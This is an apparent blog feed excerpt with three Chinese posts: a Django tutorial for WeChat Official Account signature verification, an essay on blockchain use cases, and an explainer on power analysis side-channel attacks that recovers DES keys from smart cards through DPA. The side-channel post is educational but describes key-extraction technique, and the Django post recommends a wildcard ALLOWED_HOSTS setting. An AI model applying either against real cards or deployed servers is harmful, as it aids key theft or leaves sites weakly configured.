应用，接入微信公众平台，并通过微信公众平台的验证。验证是指验证消息的确来自微信服务器。提取验证消息中的 <code>signature</code>、<code>timestamp</code>、<code>nonce</code> 和 <code>echostr</code>，计算对比 <code>signature</code> 字段是否正确。详细过程请参考公众平台官方文档：<a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319</a></p><p>现在，<code>mysite</code> 项目的目录应该是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mysite</span><br><span class="line">├── manage.py</span><br><span class="line">├── mysite</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── settings.py</span><br><span class="line">│   ├── urls.py</span><br><span class="line">│   └── wsgi.py</span><br><span class="line">└── wechat</span><br><span class="line">    ├── admin.py</span><br><span class="line">    ├── apps.py</span><br><span class="line">    ├── __init__.py</span><br><span class="line">    ├── models.py</span><br><span class="line">    ├── tests.py</span><br><span class="line">    └── views.py</span><br></pre></td></tr></table></figure><p>接入微信公众平台主要涉及三个文件：<code>mysite/urls.py</code>、<code>wechat/urls.py</code> 和 <code>wechat/views.py</code>：</p><ul><li><code>mysite/urls.py</code> 负责解析公众平台 URL 请求中的 <code>wechat/</code>，指向 <code>wechat</code> 应用中定义的 <code>urls</code>；</li><li><code>wechat/urls.py</code> 负责解析 Django 提取的 <code>wechat/</code> 后的 URL，需要自己手动创建；</li><li><code>wechat/views.py</code> 负责实现对公众平台消息的验证；</li></ul><h3 id="创建-wechat-urls-py"><a href="#创建-wechat-urls-py" class="headerlink" title="创建 wechat/urls.py"></a>创建 <strong>wechat/urls.py</strong></h3><p>在 <code>wechat</code> 目录中创建 <code>urls.py</code>，添加以下内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url, include</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&apos;^$&apos;, views.WeChat),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>你也许已经注意到了首字母大写的 <code>WeChat</code>，这是接下来我们要在 <code>wechat/views.py</code> 中编写的公众平台验证方法。</p><h3 id="修改-mysite-urls-py"><a href="#修改-mysite-urls-py" class="headerlink" title="修改 mysite/urls.py"></a>修改 <strong>mysite/urls.py</strong></h3><p>为 <code>mysite/urls.py</code> 添加 <code>wechat/</code> 的解析，修改后的 <code>mysite/urls.py</code> 为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^wechat/'</span>, include(<span class="string">'wechat.urls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="修改-wechat-views-py"><a href="#修改-wechat-views-py" class="headerlink" title="修改 wechat/views.py"></a>修改 <strong>wechat/views.py</strong></h3><p>添加 <code>WeChat()</code> 方法，用于完成对公众平台消息的验证，修改后的 <code>wechat/views.py</code> 内容为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django.views.decorators.csrf <span class="keyword">import</span> csrf_exempt</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="meta">@csrf_exempt</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">WeChat</span><span class="params">(request)</span>:</span></span><br><span class="line">    token = <span class="string">'xxx'</span>    <span class="comment"># 填入你的 Token</span></span><br><span class="line"></span><br><span class="line">    signature = request.GET.get(<span class="string">'signature'</span>, <span class="string">''</span>)</span><br><span class="line">    timestamp = request.GET.get(<span class="string">'timestamp'</span>, <span class="string">''</span>)</span><br><span class="line">    nonce = request.GET.get(<span class="string">'nonce'</span>, <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算排序后的哈希值并比较</span></span><br><span class="line">    tmp_sig = hashlib.sha1(<span class="string">''</span>.join(sorted([token, timestamp, nonce]))).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> tmp_sig == signature:</span><br><span class="line">        <span class="keyword">return</span> HttpResponse(request.GET.get(<span class="string">'echostr'</span>, <span class="string">''</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'error'</span>)</span><br></pre></td></tr></table></figure><h3 id="运行-Django-应用"><a href="#运行-Django-应用" class="headerlink" title="运行 Django 应用"></a>运行 Django 应用</h3><p>至此，<code>wechat</code> 应用编写完成。下面，我们需要验证一下应用是否能够正确运行。</p><p>启动 Django：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py runserver <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span></span><br></pre></td></tr></table></figure><p>如果出现了以下提示，则说明运行成功了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Django version 1.10.1, using settings &apos;mysite.settings&apos;</span><br><span class="line">Starting development server at http://0.0.0.0:80/</span><br><span class="line">Quit the server with CONTROL-C.</span><br></pre></td></tr></table></figure><p>在提示信息中，也许还包括以下提示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">You have 13 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, contenttypes, sessions.</span><br><span class="line">Run &apos;python manage.py migrate&apos; to apply them.</span><br></pre></td></tr></table></figure><p>按照要求运行一下 <code>python manage.py migrate</code> 即可。</p><p>在微信公众平台服务器配置中点击「提交」按钮提交配置信息，显示「提交成功」的消息后说明已经正确接入微信公众平台了。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-09-25_213826.webp" alt="成功接入微信公众平台" title="成功接入微信公众平台"></p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>如果正式部署 Django，建议配合 <code>Nginx</code> 或 <code>Apache</code> 作为前端代理；</li><li>Django 默认开启了调试模式，正式部署项目时为了安全务必<strong>关闭调试</strong>，具体方法是把 <code>mysite、settings.py</code> 中的 <code>DEBUG = True</code> 改为 <code>DEBUG = False</code>；</li></ol><h2 id="项目源码"><a href="#项目源码" class="headerlink" title="项目源码"></a>项目源码</h2><p>源码已托管至 Github <a href="https://github.com/gymgle/Gnotes/tree/master/WeChat/wechat-mp-check-signature-demo/mysite" target="_blank" rel="noopener">https://github.com/gymgle/Gnotes/tree/master/WeChat/wechat-mp-check-signature-demo/mysite</a></p><h2 id="踩过的坑"><a href="#踩过的坑" class="headerlink" title="踩过的坑"></a>踩过的坑</h2><ol><li><p><strong><code>from django.conf.urls.defaults import * ImportError: No module named defaults</code></strong><br>因为 <code>django.conf.urls.default</code> 在 Django 1.6 中被移除，建议改为 <code>from django.conf.urls import patterns, url, include</code>，而在 Django 1.9 中，<code>django.conf.urls.patterns()</code> 也被移除了，不需要再导入 patterns，只在 <code>urls.py</code> 中 <code>from django.conf.urls import url, include</code>：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">   url(...),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p><strong><code>AttributeError: &#39;WSGIRequest&#39; object has no attribute &#39;REQUEST&#39;</code></strong><br><code>request.REQUEST.get(&#39;signature&#39;, &#39;&#39;)</code> 的用法已经过时，改为 <code>request.GET.get(&quot;page&quot;)</code> 或 <code>request.POST.get(&quot;page&quot;)</code></p></li><li><p><strong><code>CommandError: You must set settings.ALLOWED_HOSTS if DEBUG is False.</code></strong><br>修改 <code>settings.py</code>，把 <code>ALLOWED_HOSTS = []</code> 改为：<code>ALLOWED_HOSTS = [&#39;*&#39;]</code></p></li><li><p><strong>微信公众平台配置正常，但自己的服务器一直收不到用户信息</strong><br>在微信公众号配置页面，注意 URL 最后带上 <code>/</code>：<code>http://xxx/wechat/</code><br>因为 Django 会解析的形式是 <code>wechat/?x=xx&amp;x=xx&amp;...</code></p></li><li><p><strong>Unknown command: ‘syncdb’</strong><br>因为在Django 1.9 及以后的版本中使用 <code>migrate</code> 代替了 <code>syscdb</code>。</p></li><li><p><strong>怎么设置 Django 1.10 的时区和语言</strong><br>修改 <code>settings.py</code>：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LANGUAGE_CODE = &apos;zh-Hans&apos;</span><br><span class="line">TIME_ZONE = &apos;Asia/Shanghai&apos;</span><br></pre></td></tr></table></figure></li><li><p><strong>Django 1.10 INSTALLED_APPS 的设置问题</strong><br>在 <code>settings.py</code> 中：</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    ...</span><br><span class="line">    &apos;wechat.apps.WechatConfig&apos;, # 不再是直接写 wechat，否则导入 models 时会出错</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ol><h2 id="参考内容"><a href="#参考内容" class="headerlink" title="参考内容"></a>参考内容</h2><ul><li>Django 官方文档 <a href="https://www.djangoproject.com/start/" target="_blank" rel="noopener">https://www.djangoproject.com/start/</a></li><li>Django 1.8.2 文档 <a href="http://python.usyiyi.cn/django_182/index.html" target="_blank" rel="noopener">http://python.usyiyi.cn/django_182/index.html</a></li><li>pip 安装文档 <a href="https://pip.pypa.io/en/stable/installing/" target="_blank" rel="noopener">https://pip.pypa.io/en/stable/installing/</a></li><li>Virtualenv 安装文档 <a href="https://virtualenv.pypa.io/en/stable/installation/" target="_blank" rel="noopener">https://virtualenv.pypa.io/en/stable/installation/</a></li><li>微信公众平台官方文档 <a href="https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319" target="_blank" rel="noopener">https://mp.weixin.qq.com/wiki?t=resource/res_main&amp;id=mp1421135319</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;本文总结了使用 &lt;code&gt;Django&lt;/code&gt; 开发微信公众号的&lt;strong&gt;后台接入过程&lt;/strong&gt;的步骤和经验，主要包括
      
    
    </summary>
    
    
      <category term="Python" scheme="https://g2ex.top/tags/Python/"/>
    
      <category term="Django" scheme="https://g2ex.top/tags/Django/"/>
    
      <category term="WeChat" scheme="https://g2ex.top/tags/WeChat/"/>
    
      <category term="Media Platform" scheme="https://g2ex.top/tags/Media-Platform/"/>
    
      <category term="Official Accounts" scheme="https://g2ex.top/tags/Official-Accounts/"/>
    
  </entry>
  
  <entry>
    <title>关于区块链应用场景的思考</title>
    <link href="https://g2ex.top/2016/09/09/My-Views-on-Blockchain-Scenarios/"/>
    <id>https://g2ex.top/2016/09/09/My-Views-on-Blockchain-Scenarios/</id>
    <published>2016-09-09T00:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-09-09_blockchain.webp" alt="此处输入图片的描述"></p><blockquote><p>读完本文大约需要 <strong>6</strong> 分钟</p></blockquote><h2 id="1-区块链应用场景的思考"><a href="#1-区块链应用场景的思考" class="headerlink" title="1. 区块链应用场景的思考"></a>1. 区块链应用场景的思考</h2><p>根据最近对比特币和区块链技术的学习，首先提出自己的两个结论：</p><p>第一，从技术角度，区块链涉及到了多领域范畴，包括了分布式、存储、密码学、心理学、经济学、博弈论、网络协议等，归根结底，这些技术最终要解决的问题，是信任的问题，即<strong>区块链技术能够在不信任的个体或组织之间建立信任关系</strong>。因此，对于某一应用场景是否适合用区块链技术解决，需要考虑的最根本的问题就是<strong>这种应用场景是否需要区块链技术去建立一个信任机制</strong>。</p><p>第二，区块链技术是如何建立起了信任呢？共识机制。单纯的提到区块链，只不过是一种数据结构，一种由「链」连接了「区块」组成的数据结构。而共识机制的引入，才能够让区块链上数据的变更得到各个节点的认同。也就是说，<strong>共识机制是区块链技术的核心</strong>。</p><p>比特币的伟大之处在于，它设计了一种工作量证明（PoW）的共识机制，使得在匿名网络中（各节点之间不存在信任）最坏情况下（存在恶意节点）的信任机制得以建立。回到上面的第一点，比特币是目前应用区块链技术最好的场景，正是因为<strong>区块链技术解决了各个不互相信任的节点之间的信任问题</strong>。对于其他设想的应用场景，如果各个节点之间本来<strong>已经存在了信任关系，那么这种场景更适合使用传统技术来解决</strong>，而不是使用区块链技术。</p><p>区块链技术现阶段还非常不成熟，无法替代传统技术，最根本的问题是上面提到的第二点，共识机制。共识机制的限制主要体现在性能和安全现阶段都还不能满足要求。</p><h2 id="2-能源区块链的思考"><a href="#2-能源区块链的思考" class="headerlink" title="2. 能源区块链的思考"></a>2. 能源区块链的思考</h2><p>对于能源与区块链技术的结合，根据最近对电力相关知识的学习，该应用场景存在非常大的限制因素，尤其是在电力行业由国家垄断的中国：</p><p>第一，<strong>信任机制</strong>。原有的用电场景下，个人对电网是完全信任（不信任也没有办法），因此区块链不适合改造原有的用电场景。新的场景设想是规划一个小型区域，区域内一部分家庭安装光伏发电设备，通过区块链的技术协议，区域内的家庭可以实现电能自由买卖，形成一个小型微网。在这种场景下，因为各家庭之间不存在信任关系，适合由区块链技术建立信任。</p><p>第二，<strong>技术约束</strong>。目前可以查到的区块链技术与能源结合的试验是「美国两个布鲁克林居民用以太坊区块链互相进行能源直接交易」。这个试验①在两个家庭之间；②基于以太坊。没有结论表明区块链技术在两个家庭之间交易电能是否变得更加方便。在设想的未来场景中，一个小型区域内有多个家庭，那么就必然需要：<br>①实现了区块链技术的智能电表；<br>②基于公开链或联盟链。如果选择联盟链，需要可信第三方来维护区块链网络节点，让每个家庭去维护自己的节点不太现实；<br>③电力存储和分配。在国家电网中，电力是不需要存储的，事先安排配电是非常重要的环节，需要至少 24 小时预测用电量，根据预测值设定发电量。在设想的电力区块链场景中，需要引入电力存储，因为存储的电能不能百分之百转化，因此会有电能损耗。另一方面，是否需要引入配电，那就牵涉到一个可信第三方来维护；<br>④当遇到发电量无法满足区域内家庭用电时，这些家庭需要接入国家的电网用电，也就是说需要两套供电系统（两套电表）；<br>⑤用电安全的保障。人命关天，安全第一，由哪方来保障。</p><p>第三，<strong>政策限制</strong>，这也是决定项目能否落地的最重要因素。中国目前的电力公司有国家电网和中国南方电网以及其他十几家地方电网公司，这些都是政府垄断性质的公司。《电力法》明确规定，只有电网公司才可以售电，除非得到政府对区块链技术试验的支持政策，否则就成了「非法售电」。在目前政策下，只能做到个人发电后售卖给电网公司，因为个人对电网是完全信任的，使用传统技术的优势要比区块链技术更大。</p><h2 id="3-区块链其他应用场景的思考"><a href="#3-区块链其他应用场景的思考" class="headerlink" title="3. 区块链其他应用场景的思考"></a>3. 区块链其他应用场景的思考</h2><p>区块链技术应用场景的设想，<strong>首先判断是否有信任问题需要解决，其次从国家政策方面考虑</strong>。目前看来，区块链技术的最佳实践只有比特币。其他衍生币种、山寨比、彩色币都带有资本炒作的嫌疑。因国内监管的因素，货币类型的区块链应用是无法由我们发起的，要想得到国家的承认，发起方只能是国家银行或者银行业的联盟组织。</p><p>另外，设计区块链技术应用场景<strong>面向的对象应该是多个体（或组织）</strong>。区块链技术解决的是多个个体（或组织）之间的信任问题，对于单个个体（或组织）内部使用区块链替代传统技术可以说是为了技术而用技术，因为个体（或组织）内部对其是完全信任的，不再需要区块链技术再去建立信任关系。</p><p>从信任需求方面考虑，<strong>跨境支付应该是一个好的应用场景</strong>。该场景中使用区块链技术能解决不同国家银行之间的信任问题，理论上来说，是可以省掉中间第三方中转银行的。但是谁来做中间的认证节点是一个问题，比特币引入挖矿让人们充当认证节点去获取利益，这种奖励机制不太适合在银行业应用。另一方面，因为交易数据的安全性与保密性的要求，区块链实现不能是公开链，最好是<strong>有一个可信第三方来维护区块链网络</strong>，现在 Ripple 做的是这个可信第三方。比较搞笑的是，说区块链技术能省掉中间第三方的中转银行，如今又出了一个第三方来维护区块链。</p><p><strong>积分交换</strong>是现阶段常被说到的一个应用场景。但积分交换要看如何设计场景，某银行或某运营商在内部以积分交换试验区块链技术<strong>只能是试验</strong>，为了用技术而是用技术，毕竟消费者对银行或运营商是完全的信任，不再需要额外的信任保证。反而消费者之间交换积分才需要信任保证，这个信任保证其实已经有了银行或运营商来背书。真正实用的积分交换场景是消费者可以与其他消费者交换多个行业内的积分，比如我可以用招行的信用卡积分交换你的建行信用卡积分，或者用我的招行信用卡积分交换你的电信手机号中的积分。不过这也需要一个有权威的规则制定者。</p><p>因此，区块链技术的应用场景还十分有限，除了货币应用之外，其他行业应用都处于摸索阶段，这也源于区块链技术的不成熟。对待新技术，应该<strong>保持审慎</strong>的态度，区块链技术也不例外。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-09-09_blockchain.webp&quot; alt=&quot;此处输入图片的描述&quot;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;读完本文大约需要 &lt;strong&gt;6&lt;/s
      
    
    </summary>
    
    
      <category term="Blockchain" scheme="https://g2ex.top/tags/Blockchain/"/>
    
      <category term="Bitcoin" scheme="https://g2ex.top/tags/Bitcoin/"/>
    
  </entry>
  
  <entry>
    <title>旁路之能量分析攻击总结</title>
    <link href="https://g2ex.top/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/"/>
    <id>https://g2ex.top/2016/05/31/Power-Analysis-Attacks-on-Smart-Card/</id>
    <published>2016-05-31T21:00:00.000Z</published>
    <updated>2020-11-25T02:09:19.688Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、理解旁路攻击"><a href="#一、理解旁路攻击" class="headerlink" title="一、理解旁路攻击"></a>一、理解旁路攻击</h2><p>在前几年的工作里，对智能卡（或者说芯片卡、CPU 卡，比如 SIM 卡、芯片银行卡、社保卡等，另外 USBKEY 也属于智能卡的一种）的安全研究比较多，主要攻击智能卡中加密算法，获取算法密钥，验证智能卡安全性。用到的攻击手法就是本文要说的旁路攻击，英文名称是 Side Channel Attacks，也有的翻译成“侧信道攻击”或者“边道攻击”，它们都是一个意思。</p><p>首先谈谈我对旁路攻击中“旁路”的理解，不论是对硬件、系统还是网络的攻击，最方便也是最直接的攻击手段是直接读取其中的信息，比如账号的密码。若此路不通，则需另辟他路，这种通过“他路”进行攻击的手段就可以叫做“旁路”攻击。</p><p>以破解某人邮箱为例，如果碰巧通过社工库找到了他泄露过的密码而撞库成功，这是最理想的。而通过 XSS 获取到了其登录邮箱的 Cookie 从而登录其邮箱的途径，可以理解为“旁路”。</p><p>再看看下面这张图，直接拿到锁的钥匙打开抽屉，是最理想的攻击途径。而通过图中的方法拿到被锁抽屉中的东西，就是“旁路”攻击了。<a href="https://www.google.com/search?q=%E7%A0%94%E7%A9%B6%E4%BA%BA%E5%91%98%E5%88%A9%E7%94%A8%E6%97%81%E8%B7%AF%E6%94%BB%E5%87%BB%E7%AA%83%E5%8F%96Android%E5%92%8CiOS%E4%B8%8A%E7%9A%84%E5%AF%86%E9%92%A5" title="研究人员利用旁路攻击窃取Android和iOS上的密钥" target="_blank" rel="noopener">《研究人员利用旁路攻击窃取Android和iOS上的密钥》</a>的这篇文章，也是属于旁路攻击的一种。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-31_power_analysis.webp" alt="旁路攻击举例" title="旁路举例"></p><p>对智能卡的旁路攻击，是上世纪 90 年代末提出的。攻击者在智能卡的 VCC 或 GND 上串联一个小的电阻，使用示波器测量该电阻上的电压降，测量的电压降和芯片的能量消耗成正比，因此可以将电压降作为能量消耗来处理，并将对应的曲线波形视为功耗曲线。同样的道理，探测电磁变化获取智能卡芯片的功耗曲线也能进行攻击。这类旁路攻击叫做能量分析攻击（Power Analysis Attack）。攻击设备的物理连接示意图如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-31_161613.webp" alt="能量分析攻击物理连接示意图" title="能量分析攻击物理连接图"></p><p>能量分析攻击的基本思想是<strong>通过分析密码设备的能量消耗获得其密钥。</strong>这种攻击利用了两类能量消耗依赖性：<strong>数据依赖性和操作依赖性。</strong>因为<strong>密码设备的瞬时能量消耗依赖于设备所处理的数据和设备所执行的操作。</strong></p><p>现在进行旁路攻击需要一套价格不菲的攻击设备。经过十几年的发展，攻击设备厂商也不再局限在国外，源于上海交大的观源信息算是国内厂商的后起之秀，郁昱教授在多个安全大会上也演示了如何克隆 SIM 卡。</p><h2 id="二、能量分析攻击"><a href="#二、能量分析攻击" class="headerlink" title="二、能量分析攻击"></a>二、能量分析攻击</h2><h3 id="1-定义"><a href="#1-定义" class="headerlink" title="1. 定义"></a>1. 定义</h3><p>能量分析攻击又分为<strong>简单能量分析攻击</strong>和<strong>差分能量分析攻击</strong>。在《智能卡安全与设计》一书中对这两种攻击方法的描述比较准确：</p><blockquote><p>简单功耗分析（Simlpe Power Analysis, SPA）攻击：从密码芯片运算的功耗波形上能够直接找出一切密钥信息的攻击方法。因为在芯片中，密钥位为 0 时运算的功耗和密钥位为 1 时运算的功耗存在差异，通过这样的差异分析出密钥位的值，按照一定规律组合得到完整的密钥。</p></blockquote><p>以下图为例，使用 SPA 就可以从芯片的功耗曲线中可以读出十六进制的关键数据。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-31_161853.webp" alt="SPA图示" title="SPA图示"></p><blockquote><p>差分功耗分析（Differential Power Analysis, DPA）攻击：需要知道算法的明文（输入）和密文（输出），通过对一系列的功耗轨迹进行分析和计算，重现加密密钥的攻击方法。</p></blockquote><p>DPA 的主要任务在于找出密钥参与运算时的功耗和密钥位的相关性，而不是直接得到密钥位的值。这个解释起来比较复杂，下面以分析 DES 算法为例讲解 DPA 的原理。</p><h3 id="2-DPA-攻击原理"><a href="#2-DPA-攻击原理" class="headerlink" title="2. DPA 攻击原理"></a>2. DPA 攻击原理</h3><p>在《能量分析攻击》一书中，作者以 AES 为例分析了 DPA 原理和攻击过程，下面以 DES 算法为例进行说明。</p><p>首先分析一次 DES 加密操作的功耗与明文第一个字节最高有效位 <code>MSB</code> 之间的依赖关系，记该比特为 <code>d</code>。为了确定 <code>d</code> 对功耗的影响，测量芯片分别加密 1000 个随机明文时的功耗。因为明文是随机的，<code>d</code> 也就是随机的，这样可以获得约 500 条 <code>d = 0</code> 时加密操作的功耗曲线，以及约 500 条 <code>d = 1</code> 时加密操作的功耗曲线。</p><p>确定 <code>d</code> 对功耗影响的一个简单方法就是计算平均值之差，即分别计算所有 <code>d = 0</code> 的功耗曲线的平均值与所有 <code>d = 1</code> 的功耗曲线的平均值，获得一条 <code>d = 0</code> 的平均功耗曲线和一条 <code>d = 1</code> 的平均功耗曲线。接下来，将这两条平均功耗曲线做减法运算，得到一条功耗曲线，称为差分功耗曲线。</p><p>观察差分功耗曲线，几乎这段时间内的所有时刻，其电压值都接近于零，但有几个特别突出的尖峰。这些尖峰表明了芯片功耗依赖于 <code>d</code> 中的那些时刻。在这一时刻，芯片所执行的指令要么直接对 <code>d</code> 进行处理，要么所处理的某些数据依赖于 <code>d</code>。在这一时刻，<code>d</code> 的相关性是最高的。</p><p>芯片的运算会直接或间接地依赖于 <code>d</code> 的指令，通过对上面尖峰出现位置的分析，说明芯片的能量消耗中包含它所处理数据的信息，在能量分析中利用这一特性，就可以确定出芯片使用的密钥。</p><h3 id="3-DPA-分析过程"><a href="#3-DPA-分析过程" class="headerlink" title="3. DPA 分析过程"></a>3. DPA 分析过程</h3><p>DES 加密共 16 轮，有效密钥 56 位，这 56 位密钥生成 16 轮子密钥参与各轮次的运算，每轮子密钥 48 位。如果已知 DES 前两轮或最后两轮的子密钥，就可以恢复出 DES 完整的密钥。</p><p>这样一来，我们的目标拆分为攻击前两轮（或最后两轮）的子密钥。</p><p>先来分析第一轮的过程。32 位明文经过扩展变换后与 48 位轮密钥进行异或，然后进入 S 盒。S 盒共 8 个，每个 6 位输入，4 位输出。</p><p><img src="https://cdn.jsdelivr.net/gh/gymgle/imgur/2016-05-31_DPA_on_DES.webp" alt="S盒" title="DES S盒"></p><p>我们关注第一个 S 盒：<code>S1</code>，<code>S1</code> 的每一个输出位都可以通过明文的 6 位和密钥 6 位来获得。将参与 <code>S1</code> 运算的 6 位明文记为 <code>p</code>，6 位密钥记为 <code>k</code>。因此，<code>S1</code> 操作对应的输出可以记为 <code>S(p⊕k)</code>。在所给出的攻击实例中，都利用了如下事实：芯片在某个时刻的能量消耗依赖于这一输出字节的最高有效位 <code>v</code>，其中，<code>v = MSB(S(p⊕k))</code>。</p><p>进行这个攻击与之前已经完成的对值 <code>d</code> 的分析过程非常相似。首先，加密 1000 个随机明文，记录相应的能量消耗。此后，将功耗曲线划分为两组：<code>v = 1</code> 的功耗曲线与 <code>v = 0</code> 的功耗曲线。与先前已经完成对明文比特d的分析不同，此时中间值 <code>v</code> 依赖于密钥字节 <code>k</code>。</p><p>最初，攻击者并不知道 <code>k</code>。然而，攻击者可以对 <code>k</code> 进行猜测，实际上，<code>k</code>只有 64 个可能值。因此，攻击者能够很容易地遍历所有可能的 <code>k</code> 值，并使用这些值来计算 <code>v</code>。在实际的攻击中，这意味着首先猜测 <code>k = 0</code>。基于这一猜测，对于 1000 次加密操作的每一次，分别计算对应的 <code>v</code>。然后，攻击者分别计算 <code>v = 1</code> 的功耗曲线平均值和 <code>v = 0</code> 的功耗曲线平均值。这样就可以绘制出两条平均功耗曲线之间的差异曲线。对于所有其他 63 个可能的密钥值，重复同样的过程。这样，攻击者就可以获得 64 个差异曲线。对于每一个密钥猜测，都有一个与之对应的差分曲线。<br>在 64 个猜测中，当猜中 <code>k</code> 时，就已经正确计算出了 <code>v</code>。因此，该密钥猜测对应的差分曲线实际上说明了芯片能量消耗对 <code>v</code> 的依赖性。由于这种依赖性的存在，对应的差分曲线中就会有明显的尖峰。</p><p>一个重要的问题是：如果基于一个错误的密钥猜测计算 <code>v</code>，会出现什么情况呢？这种情况下，所计算出的v值将功耗曲线划分为两组（<code>v = 1</code> 和 <code>v = 0</code>），但是芯片没有处理这些计算所得到的 <code>v</code> 值。因此，能量消耗就不会依赖于这些值，所以对应的差分曲线中就不会有大尖峰出现。</p><p>同理，依次猜测 S2、S3……S8 参与运算的密钥位，就可以获得第一轮的 48 位子密钥。</p><p>再同理获得第二轮子密钥，然后组合这两轮子密钥还原为 DES 完整密钥。</p><p>使用这种策略的攻击称为差分能量分析（DPA）。这种攻击利用了这样一个事实：<strong>密钥设备的能量消耗依赖于算法执行过程中所处理的中间值</strong>。上面的攻击分析中，已经利用过这样一个事实：芯片的能量消耗依赖于第 1 轮中 S 盒的输出数据的 MSB。同样，攻击者也可以利用其他的中间值来实施攻击。特别地，攻击者可以利用依赖于其他密钥字节的中间值来实施攻击，这样就可以很容易地恢复出完整的 DES 密钥。</p><h3 id="4-其他说明"><a href="#4-其他说明" class="headerlink" title="4. 其他说明"></a>4. 其他说明</h3><p>对称算法与非对称算法的 DPA 攻击原理不同，CRT 方式实现的 RSA 算法攻击的是 CRT 的组合阶段。</p><p>另外，除 SPA 和 DPA 之外，其实还有一种叫做<code>错误注入</code>（DFA）的攻击手段，也属于能量分析攻击，这里不再介绍。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li>张之津等著《智能卡安全与设计》，清华大学出版社</li><li>[奥]Stefan Mangard 等著，冯登国等译《能量分析攻击》科学出版社</li></ol>]]></content>
    
    <summary type="html">
    
      
      
